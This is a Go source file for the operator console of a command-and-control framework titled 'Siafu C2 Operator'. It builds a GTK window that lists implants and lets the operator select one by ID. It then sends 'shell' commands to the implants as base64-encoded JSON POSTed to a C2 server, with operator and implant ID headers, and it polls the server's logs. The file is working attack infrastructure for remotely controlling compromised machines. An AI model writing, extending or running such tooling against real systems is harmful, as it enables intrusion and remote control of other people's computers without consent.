
package main

import (
    "fmt"
    "net/http"
    "strings"
    "bytes"
    "encoding/base64"
    "encoding/json"
    "io/ioutil"
    "time"
    "github.com/fstanis/screenresolution"
    "github.com/gotk3/gotk3/gtk"
    "github.com/gotk3/gotk3/glib"

)

const (
    operatorID = "123abc"
)

type Command struct {
    Group    string `json:"Group"`
    String   string `json:"String"`
    Response string `json:"Response"`
}
var serverURL string
var implant_cmd bool
var server_cmd bool
var implantID string
var ID_Set bool
var response string
var entry *gtk.Entry
var cmdPlaceHolder string

func main() {
    gtk.Init(nil)

    // Create the main window
    win, err := gtk.WindowNew(gtk.WINDOW_TOPLEVEL)
    if err != nil {
        fmt.Println("Unable to create window:", err)
    }
    win.SetTitle("Siafu C2 Operator")
    win.Connect("destroy", func() {
        gtk.MainQuit()
    })

    // Create a menubar
    menubar, err := gtk.MenuBarNew()
    if err != nil {
        fmt.Println("Unable to create menubar:", err)
    }

    // Create menu items
    fileMenu := createFileMenu()
    serverMenu := createServerMenu()
    buildMenu := createBuildMenu()

    // Attach the menu items to the menubar
    menubar.Append(fileMenu)
    menubar.Append(serverMenu)
    menubar.Append(buildMenu)

    // Create a vertical box container
    vbox, _ := gtk.BoxNew(gtk.ORIENTATION_VERTICAL, 10)
    win.Add(vbox)

    // Add the menubar to the window
    vbox.PackStart(menubar, false, false, 0)

    // Create a vertical paned widget to divide the window into two panes
    paned, _ := gtk.PanedNew(gtk.ORIENTATION_VERTICAL)
    vbox.PackStart(paned, true, true, 0)

    // Top Pane: Add a horizontal paned widget to divide into two panes
    topPaned, _ := gtk.PanedNew(gtk.ORIENTATION_HORIZONTAL)
    paned.Pack1(topPaned, true, true)

    // Top left pane in the top paned
    implantTable, _ := gtk.ScrolledWindowNew(nil, nil)
    topPaned.Pack1(implantTable, true, true)
    treeView, _ := gtk.TreeViewNew()
    implantTable.Add(treeView)

    // Add some sample data to the tree view
    model, _ := gtk.TreeStoreNew(glib.TYPE_STRING)
    treeView.SetModel(model)
    col, _ := gtk.TreeViewColumnNew()
    renderer, _ := gtk.CellRendererTextNew()
    col.PackStart(renderer, true)
    col.AddAttribute(renderer, "text", 0)
    treeView.AppendColumn(col)
    iter := model.Append(nil)
    model.SetValue(iter, 0, "Sample Data")

    // Top right pane in the top paned
    scrolledText, _ := gtk.ScrolledWindowNew(nil, nil)
    topPaned.Pack2(scrolledText, true, true)
    servertxt, _ := gtk.TextViewNew()
    servertxt.SetEditable(false) // Make the TextView read-only
    scrolledText.Add(servertxt)

    go func() {
        for {
            cmdGroup := "log"
            cmdString := ""
            responseChan := make(chan string)
            // Launch the server command in a goroutine
            go func() {
                servercommand(cmdGroup, cmdString, responseChan)
            }()
            // Wait for the response or timeout
            select {
            case logText := <-responseChan:
                buffer, _ := servertxt.GetBuffer()
                buffer.SetText(logText)
    
            case <-time.After(5 * time.Second):
            }
    
            // Sleep for 5 seconds before fetching logs again
            time.Sleep(5 * time.Second)
        }
    }()

    // Bottom Pane: Add a scrolled window with a text view (for displaying commands)
    cmdlog, _ := gtk.ScrolledWindowNew(nil, nil)
    paned.Pack2(cmdlog, true, true)
    cmdtxt, _ := gtk.TextViewNew()
    cmdtxt.SetEditable(false)
    cmdlog.Add(cmdtxt)

    // Entry Widget: Add an entry widget at the bottom for entering commands
    entry, _ = gtk.EntryNew() // Initialize the entry variable
    vbox.PackEnd(entry, false, false, 0)
    setPlaceholderText()

    // Get the text buffer from the text view
    buffer, _ := cmdtxt.GetBuffer()

    // Connect the "activate" signal of the entry widget to handle command input
    entry.Connect("activate", func() {
        cmd, _ := entry.GetText()
        handleCmd(cmd, buffer)
        entry.SetText("") // Clear the entry widget after handling the command
    })

    ScreenWidth := 0
    ScreenHeight := 0
	resolution := screenresolution.GetPrimary()
    if resolution.Width == 0 && resolution.Height == 0 {
        ScreenWidth = 600
        ScreenHeight = 400
    } else {
        ScreenWidth = int(float64(resolution.Width) * 0.5)
        ScreenHeight = int(float64(resolution.Height) * 0.5)
    }

    // Set the default size and show all widgets
    win.SetDefaultSize(ScreenWidth, ScreenHeight)
    win.ShowAll()

    // Start the GTK main event loop
    gtk.Main()
}

func createFileMenu() *gtk.MenuItem {
    menu, _ := gtk.MenuItemNewWithLabel("File")
    submenu, _ := gtk.MenuNew()

    quitItem, _ := gtk.MenuItemNewWithLabel("Quit")
    quitItem.Connect("activate", func() {
        gtk.MainQuit()
    })

    submenu.Append(quitItem)
    menu.SetSubmenu(submenu)

    return menu
}

var entryDialog *gtk.Dialog

func createServerMenu() *gtk.MenuItem {
    menu, _ := gtk.MenuItemNewWithLabel("Server")
    submenu, _ := gtk.MenuNew()

    entryItem, _ := gtk.MenuItemNewWithLabel("Set Server IP")

    entryDialog, _ = gtk.DialogNew()
    entryDialog.SetTransientFor(nil)
    entryDialog.SetTitle("Enter Server IP")

    // Create an entry field
    entry, _ := gtk.EntryNew()
    entry.SetHExpand(true) // Allow entry to expand horizontally

    // Add the entry field to the content area of the dialog
    contentArea, err := entryDialog.GetContentArea()
    if err != nil {
        fmt.Println("Error getting content area:", err)
        return menu
    }
    contentArea.Add(entry)

    // Add OK and Cancel buttons to the dialog
    okButton, _ := entryDialog.AddButton("OK", gtk.RESPONSE_OK)
    cancelButton, _ := entryDialog.AddButton("Cancel", gtk.RESPONSE_CANCEL)

    okButton.Connect("clicked", func() {
        // Get the text entered in the entry field
        serverIP, _ := entry.GetText()
        fmt.Println("Server IP:", serverIP)
        serverURL = serverIP
        entryDialog.Hide()
    })

    cancelButton.Connect("clicked", func() {
        entryDialog.Hide()
    })

    entryItem.Connect("activate", func() {
        entryDialog.ShowAll()
    })

    submenu.Append(entryItem)
    menu.SetSubmenu(submenu)

    return menu
}


func createBuildMenu() *gtk.MenuItem {
    menu, _ := gtk.MenuItemNewWithLabel("Build")
    // Create submenu items for Build menu if needed
    return menu
}

func setPlaceholderText() {
    cmdPlaceHolder = "Siafu >> "
    if implantID != "" {
        cmdPlaceHolder = fmt.Sprintf("Siafu [Implant: %s] >> ", implantID)
    }
    entry.SetPlaceholderText(cmdPlaceHolder)
}

func handleCmd(cmd string, buffer *gtk.TextBuffer) {
    fmt.Println(cmdPlaceHolder)
    iter := buffer.GetEndIter()
    buffer.Insert(iter, fmt.Sprintf("%s %s\n", cmdPlaceHolder, cmd))
    
    // Create a response channel for receiving command output
    responseChan := make(chan string)

    // Execute the command asynchronously
    go func() {
        routeCMD(cmd, responseChan)

        close(responseChan)
    }()
    

    output, ok := <-responseChan
    if implant_cmd && !ok {
        fmt.Println("Response channel was closed unexpectedly")
        return
    }
    // Pass output to handleOutput
    handleOutput(output, buffer)
    
}

func handleOutput(output string, buffer *gtk.TextBuffer){
    // Insert the output into the text buffer
    iter := buffer.GetEndIter()
    buffer.Insert(iter, output)
}

func routeCMD(input string, responseChan chan<- string) {
        // Trim spaces and newline characters from the input
        input = strings.TrimSpace(input)

        // Parse the input command
        parts := strings.Fields(input)
        if len(parts) < 2 {
            fmt.Println("Invalid command. Please provide a command group and a command.")
            return
        }

        cmdGroup := parts[0]
        switch cmdGroup {
        case "shell":
            implant_cmd = true
        case "implant":
            ID_Set = false
            for _, part := range parts {
                if strings.HasPrefix(part, "-s") {
                    subPart := strings.Split(parts[2], " ")
                    implantID = subPart[0]
                    setPlaceholderText()

                    if implantID != "" {
                        server_cmd = false
                        ID_Set = true
                        return
                    }
                }
            }
            if !ID_Set {
                server_cmd = true
            }
            
        default:
            fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
            return
        }
        cmdString := strings.Join(parts[1:], " ")

        if implant_cmd {
            err := sendCommand(cmdGroup, cmdString, responseChan)
            if err != nil {
                fmt.Println("Error sending command:", err)
                return
            }
        }
        
        if server_cmd {
            
            err := servercommand(cmdGroup, cmdString, responseChan)
            if err != nil {
                fmt.Println("Error sending command:", err)
                return
            }
        }
    }

func sendCommand(cmdGroup, cmdString string, responseChan chan<- string) error {
    endpoint := "/operator"
    server := serverURL + endpoint
    client := &http.Client{}

    commandURL := server
    
    cmdData := Command{
        Group:   cmdGroup,
        String:  cmdString,
        Response: "", 
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Send request to server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Serialize command data to JSON
    jsonData, err := json.Marshal(cmdData)
    if err != nil {
        return fmt.Errorf("error marshaling JSON data: %w", err)
    }

    // Base64 encode the JSON data
    base64Data := base64.StdEncoding.EncodeToString(jsonData)

    // Create HTTP request
    req, err := http.NewRequest("POST", commandURL, bytes.NewBuffer([]byte(base64Data)))
    if err != nil {
        return fmt.Errorf("error creating HTTP request: %w", err)
    }
    req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
    req.Header.Set("Operator-ID", operatorID)
    req.Header.Set("Implant-ID", implantID)

    // Send request
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Receive response from server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    var responseBytes []byte
    var responseBody string
    var decodedData []byte
    for {
        // Read the response
        responseBytes, err = ioutil.ReadAll(resp.Body)
        if err != nil {
            return fmt.Errorf("error reading response body: %w", err)
        }
        responseBody = string(responseBytes) // Convert []byte to string
    // Extract and decode data value
        dataIndex := strings.Index(responseBody, "Data:")
        if dataIndex != -1 {
            data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
            decodedData, err = base64.StdEncoding.DecodeString(data)
            if err != nil {
                return fmt.Errorf("error decoding base64 data: %w", err)
            }
        } else {
            fmt.Println("Data not found in response")
        }
        if len(responseBody) > 0 {
            break
        }
        time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
    }
    
    // Unmarshal JSON
   var respstruct Command

   // Trim leading and trailing whitespace
   decodedData = bytes.TrimSpace(decodedData)
   
   err = json.Unmarshal(decodedData, &respstruct)
   if err != nil {
       return fmt.Errorf("Failed to unmarshal JSON: %s", err)
   }

    responseChan <- respstruct.Response
    defer resp.Body.Close()
    return nil
}


func servercommand(cmdGroup, cmdString string, responseChan chan<- string) error {
    endpoint := "/info"
    server := serverURL + endpoint
    client := &http.Client{}

    commandURL := server
    
    cmdData := Command{
        Group:   cmdGroup,
        String:  cmdString,
        Response: "", 
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Send request to server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Serialize command data to JSON
    jsonData, err := json.Marshal(cmdData)
    if err != nil {
        return fmt.Errorf("error marshaling JSON data: %w", err)
    }

    // Base64 encode the JSON data
    base64Data := base64.StdEncoding.EncodeToString(jsonData)

    // Create HTTP request
    req, err := http.NewRequest("GET", commandURL, bytes.NewBuffer([]byte(base64Data)))
    if err != nil {
        return fmt.Errorf("error creating HTTP request: %w", err)
    }
    req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
    req.Header.Set("Operator-ID", operatorID)

    // Send request
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Receive response from server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    var responseBytes []byte
    var responseBody string
    var decodedData []byte
    for {
        // Read the response
        responseBytes, err = ioutil.ReadAll(resp.Body)
        if err != nil {
            return fmt.Errorf("error reading response body: %w", err)
        }
        responseBody = string(responseBytes) // Convert []byte to string
    // Extract and decode data value
        dataIndex := strings.Index(responseBody, "Data:")
        if dataIndex != -1 {
            data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
            decodedData, err = base64.StdEncoding.DecodeString(data)
            if err != nil {
                return fmt.Errorf("error decoding base64 data: %w", err)
            }
        } else {
            fmt.Println("Data not found in response")
        }
        if len(responseBody) > 0 {
            break
        }
        time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
    }
    
    // Unmarshal JSON
    var respstruct Command

   // Trim leading and trailing whitespace
    decodedData = bytes.TrimSpace(decodedData)
   
    err = json.Unmarshal(decodedData, &respstruct)
    if err != nil {
        return fmt.Errorf("Failed to unmarshal JSON: %s", err)
    }
   
    responseChan <- respstruct.Response
    defer resp.Body.Close()
    return nil
}


// Helper functions to convert uint32 to bytes and vice versa
func uint32ToBytes(n uint32) []byte {
    b := make([]byte, 4)
    b[0] = byte(n >> 24)
    b[1] = byte(n >> 16)
    b[2] = byte(n >> 8)
    b[3] = byte(n)
    return b
}

func bytesToUint32(b []byte) uint32 {
    return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}
